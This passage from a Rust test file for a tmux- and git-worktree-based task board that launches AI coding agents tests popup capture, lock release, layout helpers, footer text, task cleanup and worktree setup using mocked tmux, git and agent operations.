    // request to move a task between columns, acted on against a phase status
    // that is itself only as fresh as its cache, so polling the queue faster
    // than that cache buys nothing.
    assert!(TRANSITION_POLL_INTERVAL > HOUSEKEEPING_TICK);
    assert!(TRANSITION_POLL_INTERVAL >= PHASE_STATUS_CACHE_TTL);
}

#[test]
fn nothing_on_the_board_animates() {
    // Every indicator is static. A spinner on an otherwise idle board would be
    // the *only* thing forcing a redraw — ten a second, forever, to rotate a
    // glyph — so a board with running tasks asks for no frame at all between
    // real changes. If a future indicator
    // animates, `run_housekeeping` has to start reporting a change again, and
    // the idle cost comes back with it.
    let src = include_str!("app.rs");
    assert!(
        !src.contains("SPINNER_FRAMES"),
        "an animated indicator is back; idle redraws return with it"
    );
}

#[test]
fn the_capture_depth_follows_the_scroll_position() {
    // At the bottom only the visible rows are rendered, so a deeper capture is
    // fetched, formatted by tmux, compared and parsed for nothing. Scrolled up,
    // the history is the whole point.
    assert_eq!(popup_capture_depth(0), SHELL_POPUP_TAIL_LINES);
    assert_eq!(popup_capture_depth(-1), SHELL_POPUP_CAPTURE_LINES);
    assert_eq!(popup_capture_depth(-40), SHELL_POPUP_CAPTURE_LINES);
    assert!(SHELL_POPUP_TAIL_LINES < SHELL_POPUP_CAPTURE_LINES);
    // Not zero: the first `C-u` has to have somewhere to scroll to, and a page
    // is the pane's height.
    assert!(
        SHELL_POPUP_TAIL_LINES >= 60,
        "the tail must cover a few pages, or the first scroll-up hits the end"
    );
}

#[test]
fn scrolling_repoints_the_watcher_without_changing_target() {
    // A scroll is not a target change, but it *is* a reason to capture again —
    // otherwise the user scrolls into a buffer that has nothing above it and
    // waits for the next paint to fill it in.
    let watch = PaneWatch::default();
    watch.follow(Some("pj:t"), SHELL_POPUP_TAIL_LINES);
    let before = watch.poke_count();

    watch.follow(Some("pj:t"), SHELL_POPUP_TAIL_LINES);
    assert_eq!(
        watch.poke_count(),
        before,
        "an unchanged depth must not poke"
    );

    watch.follow(Some("pj:t"), SHELL_POPUP_CAPTURE_LINES);
    assert_ne!(
        watch.poke_count(),
        before,
        "scrolling up must trigger a deeper capture immediately"
    );
}

#[test]
fn the_popup_renders_the_lines_the_watcher_parsed() {
    // The parse moved off the UI thread, so the bytes and the styled lines are
    // now two fields that must be set together: rendering from lines that do
    // not match the bytes change detection compares would leave a wrong frame
    // on screen forever, because the next capture would compare equal.
    let mut popup = ShellPopup::new("t".to_string(), "pj:t".to_string());
    let content = b"\x1b[31mred\x1b[0m\nplain\n".to_vec();
    let lines = parse_ansi_to_lines(&content);
    assert_eq!(lines.len(), 2);
    popup.set_content(content.clone(), lines, Some(1));
    assert_eq!(popup.cached_content, content);
    assert_eq!(popup.cached_lines.len(), 2);
    // Scrolling still reads the byte side, so the two must describe one pane.
    assert_eq!(
        popup.cached_lines.len(),
        String::from_utf8_lossy(&popup.cached_content)
            .lines()
            .count()
    );
}

/// Both waits must release `PaneWatch`'s lock before returning, because the
/// watcher takes it again straight afterwards and `Mutex` is not reentrant.
///
/// This is the invariant that broke: written inline, the arm that did not hand
/// its guard to `wait_timeout` kept the guard for the rest of the iteration, the
/// rate limit below re-locked, and the watcher deadlocked *holding the lock the
/// UI thread calls `follow()` on every iteration* — so the whole TUI froze. The
/// waits are methods now so the guard cannot escape them; this pins that.
#[test]
fn the_waits_release_the_lock_before_returning() {
    let watch = PaneWatch::default();
    watch.follow(Some("pj:t1"), SHELL_POPUP_TAIL_LINES);

    // The arm that keeps its guard: a poke already landed, so the wait is
    // skipped entirely rather than handed to `wait_timeout`.
    watch.poke();
    let outcome = watch
        .wait_for_change(0, 0, std::time::Duration::from_millis(50))
        .expect("not stopped");
    assert!(
        outcome.skipped,
        "a poke that already landed must skip the wait"
    );
    assert!(outcome.poked);
    assert!(
        watch.inner.try_lock().is_ok(),
        "wait_for_change returned still holding the lock"
    );

    // And the arm that does wait.
    let (poke, signal) = {
        let state = watch.inner.lock().expect("lock");
        (state.poke, state.signal)
    };
    let outcome = watch
        .wait_for_change(poke, signal, std::time::Duration::from_millis(1))
        .expect("not stopped");
    assert!(!outcome.skipped);
    assert!(
        watch.inner.try_lock().is_ok(),
        "wait_for_change returned still holding the lock after waiting"
    );

    assert!(watch
        .wait_out_rate_limit(std::time::Duration::from_millis(1))
        .is_some());
    assert!(
        watch.inner.try_lock().is_ok(),
        "wait_out_rate_limit returned still holding the lock"
    );
}

#[test]
fn a_pane_watch_follows_the_open_popup() {
    let watch = PaneWatch::default();
    assert_eq!(watch.target(), None);

    watch.follow(Some("task-one"), SHELL_POPUP_TAIL_LINES);
    assert_eq!(watch.target().as_deref(), Some("task-one"));
    let after_first = watch.poke_count();

    // Following the same target again must not poke: this is called every loop
    // iteration, and a poke means "capture now at the fast cadence".
    watch.follow(Some("task-one"), SHELL_POPUP_TAIL_LINES);
    assert_eq!(watch.poke_count(), after_first);

    // A switch and a close both have to reach the watcher, or it would keep
    // capturing a pane nobody is looking at.
    watch.follow(Some("task-two"), SHELL_POPUP_TAIL_LINES);
    assert_eq!(watch.target().as_deref(), Some("task-two"));
    assert_ne!(watch.poke_count(), after_first);
    watch.follow(None, SHELL_POPUP_TAIL_LINES);
    assert_eq!(watch.target(), None);
}

// =============================================================================
// Tests for capture_tmux_pane_snapshot
// =============================================================================

/// Test capturing tmux pane content
#[test]
#[cfg(feature = "test-mocks")]
fn test_capture_tmux_pane_snapshot() {
    let mut mock_tmux = MockTmuxOperations::new();

    mock_tmux
        .expect_capture_pane_with_history()
        .with(
            mockall::predicate::eq("test-window"),
            mockall::predicate::eq(500),
        )
        .returning(|_, _| b"Line 1\nLine 2\nLine 3\n".to_vec());

    mock_tmux
        .expect_pane_metrics()
        .with(mockall::predicate::eq("test-window"))
        .returning(|_| {
            Some(crate::tmux::PaneMetrics {
                cursor_x: 0,
                cursor_y: 2,
                pane_height: 3,
                history_size: 0,
            })
        });

    let (content, metrics, _cursor_line) =
        capture_tmux_pane_snapshot("test-window", 500, &mock_tmux);

    // Content should be trimmed to cursor position
    assert!(!content.is_empty());
    // The metrics come back with it, so a popup can seed `has_scrollback()`
    // at open time instead of waiting for the first refresh.
    assert_eq!(metrics.map(|m| m.history_size), Some(0));
}

/// A sink that answers captures from a canned snapshot, standing in for a live
/// control connection.
#[cfg(feature = "test-mocks")]
struct CapturingSink(Option<crate::tmux::PaneSnapshot>);

#[cfg(feature = "test-mocks")]
impl PaneInputSink for CapturingSink {
    fn send(
        &self,
        _input: crate::tmux::PaneInput,
    ) -> std::result::Result<(), crate::tmux::InputError> {
        Ok(())
    }
    fn capture(
        &self,
        _target: &str,
        _spec: crate::tmux::CaptureSpec,
    ) -> Option<crate::tmux::PaneSnapshot> {
        self.0.clone()
    }
}

/// The popup's capture goes to the broker's control connection when there is
/// one: the `tmux` process startup it replaces was most of the delay between
/// typing into a task pane and seeing the character.
#[test]
#[cfg(feature = "test-mocks")]
fn the_popup_capture_prefers_the_input_connection() {
    let mut mock_tmux = MockTmuxOperations::new();
    // Not `times(0)` on a permissive mock: an unexpected call panics, which is
    // the assertion. Neither subprocess may run when the sink answers.
    mock_tmux.expect_capture_pane_with_history().never();
    mock_tmux.expect_pane_metrics().never();

    let sink = CapturingSink(Some(crate::tmux::PaneSnapshot {
        content: b"from control\n".to_vec(),
        metrics: Some(crate::tmux::PaneMetrics {
            cursor_x: 0,
            cursor_y: 0,
            pane_height: 1,
            history_size: 7,
        }),
    }));

    let (content, metrics, _cursor_line) =
        capture_pane_for_popup("test-window", 500, &sink, &mock_tmux);
    // Trimmed to the cursor, exactly as the subprocess path is.
    assert_eq!(content, b"from control".to_vec());
    assert_eq!(metrics.map(|m| m.history_size), Some(7));
}

/// And falls back untouched when it does not: control mode is off, the
/// connection is down, or the queue is full. A missed capture costs one frame at
/// the fallback's speed, never a blank popup.
#[test]
#[cfg(feature = "test-mocks")]
fn the_popup_capture_falls_back_to_the_subprocess_path() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_capture_pane_with_history()
        .returning(|_, _| b"from subprocess\n".to_vec());
    mock_tmux.expect_pane_metrics().returning(|_| {
        Some(crate::tmux::PaneMetrics {
            cursor_x: 0,
            cursor_y: 0,
            pane_height: 1,
            history_size: 3,
        })
    });

    let (content, metrics, _cursor_line) =
        capture_pane_for_popup("test-window", 500, &CapturingSink(None), &mock_tmux);
    assert_eq!(content, b"from subprocess".to_vec());
    assert_eq!(metrics.map(|m| m.history_size), Some(3));
}

// =============================================================================
// Tests for centered_rect helpers (pure functions, no mocks needed)
// =============================================================================

/// Test centered_rect creates correct dimensions
#[test]
fn test_centered_rect() {
    let area = Rect::new(0, 0, 100, 50);
    let popup = centered_rect(50, 50, area);

    // Should be centered horizontally and vertically
    assert!(popup.x > 0);
    assert!(popup.y > 0);
    assert!(popup.width < 100);
    assert!(popup.height < 50);
}

/// Test centered_rect_fixed_width creates correct dimensions
#[test]
fn test_centered_rect_fixed_width() {
    let area = Rect::new(0, 0, 100, 50);
    let popup = centered_rect_fixed_width(40, 50, area);

    // Width should be fixed at 40
    assert_eq!(popup.width, 40);
    // Should be centered
    assert_eq!(popup.x, 30); // (100 - 40) / 2
}

/// Test centered_rect_fixed_width caps width to terminal size
#[test]
fn test_centered_rect_fixed_width_capped() {
    let area = Rect::new(0, 0, 30, 50); // Small terminal
    let popup = centered_rect_fixed_width(100, 50, area); // Request large width

    // Width should be capped
    assert!(popup.width <= 30);
}

// =============================================================================
// Tests for hex_to_color
// =============================================================================

/// Test hex_to_color with valid hex
#[test]
fn test_hex_to_color_valid() {
    let color = hex_to_color("#FF0000");
    assert_eq!(color, Color::Rgb(255, 0, 0));
}

/// Test hex_to_color with invalid hex falls back to white
#[test]
fn test_hex_to_color_invalid() {
    let color = hex_to_color("invalid");
    assert_eq!(color, Color::White);
}

// =============================================================================
// Tests for generate_task_slug
// =============================================================================

/// Test generate_task_slug with normal title
#[test]
fn test_generate_task_slug_normal() {
    let slug = generate_task_slug("12345678-abcd-efgh", "Add login feature");
    assert!(slug.starts_with("12345678-"));
    assert!(slug.contains("Add-login-feature"));
}

/// Test generate_task_slug with special characters
#[test]
fn test_generate_task_slug_special_chars() {
    let slug = generate_task_slug("abc12345", "Fix bug #123 (urgent!)");
    assert!(slug.starts_with("abc12345-"));
    // Special chars should be replaced with dashes
    assert!(!slug.contains("#"));
    assert!(!slug.contains("("));
    assert!(!slug.contains("!"));
}

/// Test generate_task_slug truncates long titles
#[test]
fn test_generate_task_slug_long_title() {
    let long_title = "This is a very long task title that should be truncated to thirty characters";
    let slug = generate_task_slug("abcd1234", long_title);
    // 8 char id prefix + "-" + max 30 chars = max 39 chars
    assert!(slug.len() <= 39);
}

/// Test generate_task_slug with empty title
#[test]
fn test_generate_task_slug_empty_title() {
    let slug = generate_task_slug("12345678", "");
    assert_eq!(slug, "12345678-");
}

// =============================================================================
// Tests for tmux::safe_session_name
// =============================================================================

#[test]
fn test_tmux_safe_session_name_replaces_dots() {
    let name = tmux::safe_session_name("lazygit.nvim");
    assert_eq!(name, "lazygit-nvim");
    assert!(!name.contains('.'));
}

// =============================================================================
// Tests for cleanup_task_for_done
// =============================================================================

/// Test cleanup_task_for_done cleans up resources
#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_for_done_with_resources() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();

    mock_tmux
        .expect_kill_window()
        .with(mockall::predicate::eq("project:task-window"))
        .times(1)
        .returning(|_| Ok(()));

    mock_git
        .expect_remove_worktree()
        .with(
            mockall::predicate::eq(Path::new("/project")),
            mockall::predicate::eq("/tmp/worktree"),
        )
        .times(1)
        .returning(|_, _| Ok(()));

    let mut task = Task::new("Test task", "claude", "project-1");
    task.session_name = Some("project:task-window".to_string());
    task.worktree_path = Some("/tmp/worktree".to_string());
    task.status = TaskStatus::Review;

    cleanup_task_for_done(
        &mut task,
        None,
        Path::new("/project"),
        &mock_tmux,
        &mock_git,
    );

    assert!(task.session_name.is_none());
    assert!(task.worktree_path.is_none());
    assert_eq!(task.status, TaskStatus::Done);
}

/// Test cleanup_task_for_done handles missing resources gracefully
#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_for_done_no_resources() {
    use crate::db::Task;

    let mock_tmux = MockTmuxOperations::new();
    let mock_git = MockGitOperations::new();
    // No expectations - functions should not be called

    let mut task = Task::new("Test task", "claude", "project-1");
    // No session_name or worktree_path set

    cleanup_task_for_done(
        &mut task,
        None,
        Path::new("/project"),
        &mock_tmux,
        &mock_git,
    );

    assert_eq!(task.status, TaskStatus::Done);
}

// =============================================================================
// Tests for delete_task_resources
// =============================================================================

/// Test delete_task_resources cleans up all resources
#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_resources_full_cleanup() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();

    mock_tmux
        .expect_kill_window()
        .with(mockall::predicate::eq("project:task-window"))
        .times(1)
        .returning(|_| Ok(()));

    mock_git
        .expect_remove_worktree()
        .times(1)
        .returning(|_, _| Ok(()));

    mock_git
        .expect_delete_branch()
        .with(
            mockall::predicate::eq(Path::new("/project")),
            mockall::predicate::eq("task/abc-feature"),
        )
        .times(1)
        .returning(|_, _| Ok(()));

    let mut task = Task::new("Feature task", "claude", "project-1");
    task.session_name = Some("project:task-window".to_string());
    task.worktree_path = Some("/tmp/worktree".to_string());
    task.branch_name = Some("task/abc-feature".to_string());

    delete_task_resources(&task, None, Path::new("/project"), &mock_tmux, &mock_git);
}

/// Test delete_task_resources handles task without resources
#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_resources_no_resources() {
    use crate::db::Task;

    let mock_tmux = MockTmuxOperations::new();
    let mock_git = MockGitOperations::new();
    // No expectations - nothing should be called

    let task = Task::new("Simple task", "claude", "project-1");
    // No session_name, worktree_path, or branch_name

    delete_task_resources(&task, None, Path::new("/project"), &mock_tmux, &mock_git);
}

// =============================================================================
// Tests for collect_task_diff
// =============================================================================

/// Test collect_task_diff with all types of changes
#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_all_changes() {
    let mut mock_git = MockGitOperations::new();

    mock_git
        .expect_diff()
        .returning(|_| "diff --git a/file.rs\n-old\n+new".to_string());

    mock_git
        .expect_diff_cached()
        .returning(|_| "diff --git a/staged.rs\n+added".to_string());

    mock_git
        .expect_list_untracked_files()
        .returning(|_| "new_file.rs\n".to_string());

    mock_git
        .expect_diff_untracked_file()
        .returning(|_, _| "+++ new_file.rs\n+content".to_string());

    let result = collect_task_diff("/tmp/worktree", &mock_git, &[]);

    assert!(result.contains("Unstaged Changes"));
    assert!(result.contains("Staged Changes"));
    assert!(result.contains("Untracked Files"));
}

/// Test collect_task_diff with no changes
#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_no_changes() {
    let mut mock_git = MockGitOperations::new();

    mock_git.expect_diff().returning(|_| String::new());
    mock_git.expect_diff_cached().returning(|_| String::new());
    mock_git
        .expect_list_untracked_files()
        .returning(|_| String::new());

    let result = collect_task_diff("/tmp/worktree", &mock_git, &[]);

    assert!(result.contains("(no changes)"));
    assert!(result.contains("/tmp/worktree"));
}

/// Test collect_task_diff with only unstaged changes
#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_only_unstaged() {
    let mut mock_git = MockGitOperations::new();

    mock_git
        .expect_diff()
        .returning(|_| "diff --git a/modified.rs".to_string());

    mock_git.expect_diff_cached().returning(|_| String::new());
    mock_git
        .expect_list_untracked_files()
        .returning(|_| String::new());

    let result = collect_task_diff("/tmp/worktree", &mock_git, &[]);

    assert!(result.contains("Unstaged Changes"));
    assert!(!result.contains("Staged Changes"));
    assert!(!result.contains("Untracked Files"));
}

// =============================================================================
// Tests for build_highlighted_text
// =============================================================================

/// Test build_highlighted_text with no file paths produces plain text
#[test]
fn test_build_highlighted_text_no_paths() {
    let paths = HashSet::new();
    let text = build_highlighted_text("hello world", &paths, Color::White, Color::Cyan);
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans.len(), 1);
    assert_eq!(lines[0].spans[0].content, "hello world");
}

/// Test build_highlighted_text highlights a single file path
#[test]
fn test_build_highlighted_text_single_path() {
    let mut paths = HashSet::new();
    paths.insert("src/main.rs".to_string());
    let text = build_highlighted_text(
        "Please edit src/main.rs for me",
        &paths,
        Color::White,
        Color::Cyan,
    );
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans.len(), 3);
    assert_eq!(lines[0].spans[0].content, "Please edit ");
    assert_eq!(lines[0].spans[1].content, "src/main.rs");
    assert_eq!(lines[0].spans[2].content, " for me");
    // The highlighted span should be bold
    assert!(lines[0].spans[1]
        .style
        .add_modifier
        .contains(Modifier::BOLD));
}

/// Test build_highlighted_text with multiple file paths on one line
#[test]
fn test_build_highlighted_text_multiple_paths() {
    let mut paths = HashSet::new();
    paths.insert("a.rs".to_string());
    paths.insert("b.rs".to_string());
    let text = build_highlighted_text("fix a.rs and b.rs", &paths, Color::White, Color::Cyan);
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 1);
    // Should be: "fix " | "a.rs" | " and " | "b.rs"
    assert_eq!(lines[0].spans.len(), 4);
    assert_eq!(lines[0].spans[1].content, "a.rs");
    assert_eq!(lines[0].spans[3].content, "b.rs");
}

/// Test build_highlighted_text with multiline input
#[test]
fn test_build_highlighted_text_multiline() {
    let mut paths = HashSet::new();
    paths.insert("app.rs".to_string());
    let text = build_highlighted_text(
        "line1\nfix app.rs\nline3",
        &paths,
        Color::White,
        Color::Cyan,
    );
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 3);
    // First line: no highlight
    assert_eq!(lines[0].spans.len(), 1);
    assert_eq!(lines[0].spans[0].content, "line1");
    // Second line: has highlight
    assert_eq!(lines[1].spans.len(), 2);
    assert_eq!(lines[1].spans[0].content, "fix ");
    assert_eq!(lines[1].spans[1].content, "app.rs");
    // Third line: no highlight
    assert_eq!(lines[2].spans.len(), 1);
    assert_eq!(lines[2].spans[0].content, "line3");
}

/// Test build_highlighted_text when path is at the start of line
#[test]
fn test_build_highlighted_text_path_at_start() {
    let mut paths = HashSet::new();
    paths.insert("src/lib.rs".to_string());
    let text = build_highlighted_text("src/lib.rs is important", &paths, Color::White, Color::Cyan);
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans.len(), 2);
    assert_eq!(lines[0].spans[0].content, "src/lib.rs");
    assert_eq!(lines[0].spans[1].content, " is important");
}

/// Test build_highlighted_text when path is the entire line
#[test]
fn test_build_highlighted_text_path_is_entire_line() {
    let mut paths = HashSet::new();
    paths.insert("Cargo.toml".to_string());
    let text = build_highlighted_text("Cargo.toml", &paths, Color::White, Color::Cyan);
    let lines: Vec<&Line> = text.lines.iter().collect();
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans.len(), 1);
    assert_eq!(lines[0].spans[0].content, "Cargo.toml");
    assert!(lines[0].spans[0]
        .style
        .add_modifier
        .contains(Modifier::BOLD));
}

// =============================================================================
// Tests for build_footer_text
// =============================================================================

#[test]
fn test_footer_text_sidebar_focused() {
    let text = build_footer_text(None, true, 0, false, false);
    assert!(text.contains("[j/k] navigate"));
    assert!(text.contains("[e] hide"));
    assert!(!text.contains("[o] new"));
}

#[test]
fn test_footer_text_backlog_column() {
    let text = build_footer_text(None, false, 0, false, false);
    assert!(text.contains("[M] run"));
    assert!(text.contains("[m] plan"));
    assert!(!text.contains("[r] move left"));
}

#[test]
fn test_footer_text_planning_column() {
    let text = build_footer_text(None, false, 1, false, false);
    assert!(text.contains("[m] run"));
    assert!(!text.contains("[M] run"));
    assert!(!text.contains("[r] move left"));
}

#[test]
fn test_footer_text_running_column() {
    let text = build_footer_text(None, false, 2, false, false);
    assert!(text.contains("[r] back"));
    assert!(text.contains("[m] move"));
}

#[test]
fn test_footer_text_fullscreen_on_enter_hides_ctrl_f() {
    // Columns 1-3 should hide [C-f] when fullscreen_on_enter is true
    for col in 1..=3 {
        let text = build_footer_text(None, false, col, false, true);
        assert!(
            !text.contains("[C-f]"),
            "Column {} should hide [C-f] when fullscreen_on_enter=true",
            col
        );
    }
    // And show it when false
    for col in 1..=3 {
        let text = build_footer_text(None, false, col, false, false);
        assert!(
            text.contains("[C-f]"),
            "Column {} should show [C-f] when fullscreen_on_enter=false",
            col
        );
    }
}

#[test]
fn test_footer_text_review_column() {
    let text = build_footer_text(None, false, 3, false, false);
    assert!(text.contains("[r] back"));
    assert!(text.contains("[m] move"));
}

#[test]
fn test_footer_text_review_column_cyclic() {
    let text = build_footer_text(None, false, 3, true, false);
    assert!(text.contains("[p] next phase"));
    assert!(text.contains("[r] resume"));
    assert!(text.contains("[m] done"));
}

#[test]
fn test_footer_text_done_column() {
    let text = build_footer_text(None, false, 4, false, false);
    assert!(!text.contains("[m] move"));
    assert!(!text.contains("[r]"));
    assert!(!text.contains("[d] diff"));
}

#[test]
fn test_footer_text_input_title() {
    let text = build_footer_text(Some(WizardStep::Title), false, 0, false, false);
    assert!(text.contains("Enter task title"));
    assert!(text.contains("[Esc] cancel"));
}

#[test]
fn test_footer_text_input_description() {
    let text = build_footer_text(Some(WizardStep::Prompt), false, 0, false, false);
    assert!(text.contains("[#] files"));
    assert!(text.contains("[/] skills"));
    assert!(text.contains("[!] tasks"));
    assert!(text.contains("[\\+Enter] newline"));
    assert!(text.contains("[S-Tab] back"));
    assert!(text.contains("[Esc] cancel"));
}

// =============================================================================
// Tests for setup_task_worktree
// =============================================================================

/// Test setup_task_worktree creates worktree, initializes it, and creates tmux window
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_success() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    // Expect worktree creation
    mock_git
        .expect_create_worktree()
        .returning(|_, slug, _, _, _| Ok(format!("/project/.agtx/worktrees/{}", slug)));

    // Expect worktree initialization
    mock_git
        .expect_initialize_worktree()
        .returning(|_, _, _, _, _| vec![]);

    // Expect agent command building
    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude --dangerously-skip-permissions '{}'", prompt));

    // Expect tmux session check and window creation
    mock_tmux.expect_has_session().returning(|_| true);

    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Ok(()));

    let mut task = Task::new("Add login feature", "claude", "project-1");
    task.status = TaskStatus::Backlog;

    let result = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "implement this",
        "main",
        ".agtx/worktrees",
        "task",
        None,
        None,
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    );

    assert!(result.is_ok());
    let (target, _launched) = result.unwrap();
    assert!(target.starts_with("my-project:task-"));
    assert!(task.session_name.is_some());
    assert!(task.worktree_path.is_some());
    assert!(task.branch_name.is_some());
    assert!(task.branch_name.as_ref().unwrap().starts_with("task/"));
}

/// Test setup_task_worktree sets correct task fields
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_sets_task_fields() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    mock_git
        .expect_create_worktree()
        .returning(|_, slug, _, _, _| Ok(format!("/project/.agtx/worktrees/{}", slug)));
    mock_git
        .expect_initialize_worktree()
        .returning(|_, _, _, _, _| vec![]);
    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude '{}'", prompt));
    mock_tmux.expect_has_session().returning(|_| true);
    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Ok(()));

    let mut task = Task::new("Fix bug", "claude", "project-1");

    let target = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "fix the bug",
        "main",
        ".agtx/worktrees",
        "task",
        Some("CLAUDE.md".to_string()),
        Some("./init.sh".to_string()),
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    )
    .unwrap();
    let (target, _launched) = target;

    // session_name should be the returned target
    assert_eq!(task.session_name.as_ref().unwrap(), &target);
    // worktree_path should contain the slug
    assert!(task
        .worktree_path
        .as_ref()
        .unwrap()
        .contains(".agtx/worktrees/"));
    // branch_name should be {prefix}/{slug}
    let slug = task
        .branch_name
        .as_ref()
        .unwrap()
        .rsplit_once('/')
        .unwrap()
        .1;
    assert!(task.worktree_path.as_ref().unwrap().ends_with(slug));
}

/// Test setup_task_worktree handles worktree creation failure gracefully
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_worktree_creation_fails() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    // Worktree creation fails
    mock_git
        .expect_create_worktree()
        .returning(|_, _, _, _, _| Err(anyhow::anyhow!("worktree already exists")));

    // Should still initialize and create window with fallback path
    mock_git
        .expect_initialize_worktree()
        .returning(|_, _, _, _, _| vec![]);
    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude '{}'", prompt));
    mock_tmux.expect_has_session().returning(|_| true);
    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Ok(()));

    let mut task = Task::new("Test task", "claude", "project-1");

    let result = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "do something",
        "main",
        ".agtx/worktrees",
        "task",
        None,
        None,
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    );

    // Should succeed despite worktree creation failure (uses fallback path)
    assert!(result.is_ok());
    assert!(task.worktree_path.is_some());
    assert!(task
        .worktree_path
        .as_ref()
        .unwrap()
        .contains(".agtx/worktrees/"));
}

/// Test setup_task_worktree fails when tmux window creation fails
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_tmux_window_fails() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    mock_git
        .expect_create_worktree()
        .returning(|_, slug, _, _, _| Ok(format!("/project/.agtx/worktrees/{}", slug)));
    mock_git
        .expect_initialize_worktree()
        .returning(|_, _, _, _, _| vec![]);
    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude '{}'", prompt));
    mock_tmux.expect_has_session().returning(|_| true);

    // Tmux window creation fails
    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Err(anyhow::anyhow!("tmux not running")));

    let mut task = Task::new("Test task", "claude", "project-1");

    let result = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "do something",
        "main",
        ".agtx/worktrees",
        "task",
        None,
        None,
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    );

    // Should propagate the error
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("tmux not running"));
}

/// Test setup_task_worktree creates tmux session when missing
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_creates_session_when_missing() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    mock_git
        .expect_create_worktree()
        .returning(|_, slug, _, _, _| Ok(format!("/project/.agtx/worktrees/{}", slug)));
    mock_git
        .expect_initialize_worktree()
        .returning(|_, _, _, _, _| vec![]);
    mock_agent
        .expect_build_interactive_command()
        .returning(|prompt| format!("claude '{}'", prompt));

    // Session doesn't exist yet
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_create_session().returning(|_, _| Ok(()));
    mock_tmux
        .expect_create_window()
        .returning(|_, _, _, _, _, _| Ok(()));

    let mut task = Task::new("New task", "claude", "project-1");

    let result = setup_task_worktree(
        &mut task,
        Path::new("/project"),
        "my-project",
        "do work",
        "main",
        ".agtx/worktrees",
        "task",
        None,
        None,
        &None,
        "claude",
        &vec!["claude".to_string()],
        &mock_tmux,
        &mock_git,
        &mock_agent,
        &[],
        false,
        false,
        false,
        None,
    );

    assert!(result.is_ok());
}

/// Test setup_task_worktree passes copy_files and init_script to initialize_worktree
#[test]
#[cfg(feature = "test-mocks")]
fn test_setup_task_worktree_passes_init_config() {
    use crate::db::Task;

    let mut mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    mock_git
        .expect_create_worktree()
        .withf(|_, _, base_branch, _, _| base_branch == "development")
        .returning(|_, slug, _, _, _| Ok(format!("/project/.agtx/worktrees/{}", slug)));

    // Verify copy_files and init_script are passed through
    mock_git
        .expect_initialize_worktree()
